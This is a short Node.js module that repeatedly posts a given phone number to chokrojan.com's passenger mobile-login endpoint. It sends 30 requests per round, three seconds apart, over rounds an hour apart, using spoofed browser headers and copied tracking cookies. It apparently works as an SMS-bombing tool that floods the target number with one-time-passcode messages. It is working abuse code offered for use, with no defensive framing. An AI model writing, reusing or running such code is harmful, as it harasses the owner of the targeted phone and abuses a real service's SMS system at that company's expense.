const axios = require("axios");

async function chokrojan(number, limit) {
  for (let round = 0; round < limit; round++) {
    console.log(`▶ Round ${round + 1}/${limit} started`);

    for (let i = 0; i < 30; i++) {
      try {
        const response = await axios.post(
  'https://chokrojan.com/api/v1/passenger/login/mobile',
  {
    'mobile_number': number
  },
  {
    headers: {
      'Accept': 'application/json, text/plain, */*',
      'Accept-Language': 'en-US,en;q=0.9',
      'Access-Control-Allow-Origin': '*',
      'Authorization': 'Bearer null',
      'Connection': 'keep-alive',
      'Content-Type': 'application/json;charset=UTF-8',
      'Cookie': '_fbp=fb.1.1750779417620.799732338767255994; _ga=GA1.1.1276773489.1750779419; _ga_TXX7J24H07=GS2.1.s1750779418$o1$g1$t1750779455$j23$l0$h0',
      'Origin': 'https://chokrojan.com',
      'Referer': 'https://chokrojan.com/login',
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'same-origin',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
      'company-id': '1',
      'domain-name': 'chokrojan.com',
      'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Android"',
      'user-platform': '3'
    }
  }
);
        
        console.log(`[${i + 1}/10] Chokrojan Sent to ${number} | Response:`, response.data);
      } catch (error) {
        console.error(`[${i + 1}/10] Chokrojan Failed:`, error.message);
      }

      await new Promise(resolve => setTimeout(resolve, 3000));
    }

    if (round < limit - 1) {
      console.log(`⏳ Waiting 1 hours before next round...`);
      await new Promise(resolve => setTimeout(resolve, 3600000));
    }
  }

  console.log("✅ All rounds completed.");
}

module.exports = { chokrojan };
